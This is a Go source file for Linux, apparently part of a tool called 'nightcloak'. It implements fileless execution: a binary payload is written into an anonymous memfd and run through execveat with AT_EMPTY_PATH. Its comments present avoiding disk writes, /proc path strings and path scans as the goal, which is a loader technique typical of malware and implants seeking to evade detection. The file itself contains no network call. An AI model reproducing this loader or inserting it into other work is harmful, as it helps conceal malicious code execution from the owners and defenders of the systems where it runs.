//go:build linux
// +build linux

package native

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

// memfd_create syscall numbers per architecture.
const (
	sysMemfdCreateAMD64 = 319
	sysMemfdCreateARM64 = 279
	sysMemfdCreateARM   = 385
	sysMemfdCreateMIPS  = 4354
)

// execveat syscall numbers per architecture.
const (
	sysExecveatAMD64 = 322
	sysExecveatARM64 = 281
	sysExecveatARM   = 387
	sysExecveatMIPS  = 4360
)

// AT_EMPTY_PATH: execute the fd directly, no path string needed.
const atEmptyPath = 0x1000

func memfdSyscall() uintptr {
	switch runtime.GOARCH {
	case "amd64":
		return sysMemfdCreateAMD64
	case "arm64":
		return sysMemfdCreateARM64
	case "arm":
		return sysMemfdCreateARM
	case "mips", "mipsle", "mips64", "mips64le":
		return sysMemfdCreateMIPS
	default:
		return sysMemfdCreateAMD64
	}
}

func execveatSyscall() uintptr {
	switch runtime.GOARCH {
	case "amd64":
		return sysExecveatAMD64
	case "arm64":
		return sysExecveatARM64
	case "arm":
		return sysExecveatARM
	case "mips", "mipsle", "mips64", "mips64le":
		return sysExecveatMIPS
	default:
		return sysExecveatAMD64
	}
}

// MemExec executes a binary payload directly from memory.
// The binary never touches disk. Uses memfd_create + execveat(AT_EMPTY_PATH)
// so no /proc path string is opened or stored in memory.
func MemExec(payload []byte, args []string) error {
	// 1. Create anonymous RAM file descriptor.
	// Flag 0: no MFD_CLOEXEC, fd must stay open until execveat replaces the process.
	namePtr := syscall.StringBytePtr("nightcloak")
	fd, _, errno := syscall.Syscall(memfdSyscall(), uintptr(unsafe.Pointer(namePtr)), 0, 0)
	if errno != 0 {
		return fmt.Errorf("memfd_create failed: %w", errno)
	}

	// 2. Write payload into the memory fd.
	f := os.NewFile(fd, "memfd")
	defer f.Close() // only runs on error — execveat replaces the process on success
	if _, err := f.Write(payload); err != nil {
		return fmt.Errorf("writing payload to memfd: %w", err)
	}

	// 3. Build argv and envp for execveat.
	argv, err := syscall.SlicePtrFromStrings(append([]string{"nightcloak"}, args...))
	if err != nil {
		return fmt.Errorf("building argv: %w", err)
	}
	envp, err := syscall.SlicePtrFromStrings(os.Environ())
	if err != nil {
		return fmt.Errorf("building envp: %w", err)
	}

	// 4. execveat(fd, "", argv, envp, AT_EMPTY_PATH)
	// Empty path + AT_EMPTY_PATH executes the fd directly — no /proc string, no path scan.
	emptyPath := syscall.StringBytePtr("")
	_, _, errno = syscall.Syscall6(
		execveatSyscall(),
		fd,
		uintptr(unsafe.Pointer(emptyPath)),
		uintptr(unsafe.Pointer(&argv[0])),
		uintptr(unsafe.Pointer(&envp[0])),
		atEmptyPath,
		0,
	)
	return fmt.Errorf("execveat failed: %w", errno)
}
